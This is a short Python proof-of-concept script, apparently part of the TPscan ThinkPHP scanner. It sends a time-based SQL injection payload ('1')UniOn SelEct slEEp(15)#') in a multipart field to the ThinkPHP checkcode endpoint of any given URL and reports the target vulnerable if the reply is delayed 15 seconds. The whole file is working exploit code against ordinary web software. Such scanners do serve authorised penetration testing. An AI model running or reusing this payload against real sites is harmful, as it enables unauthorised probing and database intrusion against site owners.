#!/usr/bin/env python
# coding=utf-8
import time
import urllib

import requests
import urllib3
from termcolor import colored

urllib3.disable_warnings()


def thinkphp_checkcode_time_sqli_verify(url):
    """thinkphp_checkcode_time_sqli_verify"""

    pocdict = {
        "vulnname": "thinkphp_checkcode_time_sqli",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": "TPscan",
        "DNT": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type": "multipart/form-data; boundary=--------641902708",
        "Accept-Encoding": "gzip, deflate, sdch",
        "Accept-Language": "zh-CN,zh;q=0.8",
    }
    payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(15)#\r\n\r\n----------641902708--"
    try:
        start_time = time.time()
        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/user/checkcode/')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if time.time() - start_time >= 15:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            pocdict['proof'] = 'time sleep 15'
            pocdict['response'] = req.status_code
            print(colored("[+] 目标存在 thinkphp_checkcode_time_sqli 漏洞\tpayload: ", "green"))
            print(colored(pocdict, 'green'))
        else:
            print(colored("\n[*] 目标不存在 thinkphp_checkcode_time_sqli 漏洞", "red"))
    except Exception as e:
        print(colored("\n[*] 目标不存在 thinkphp_checkcode_time_sqli 漏洞", "red"))
        pass
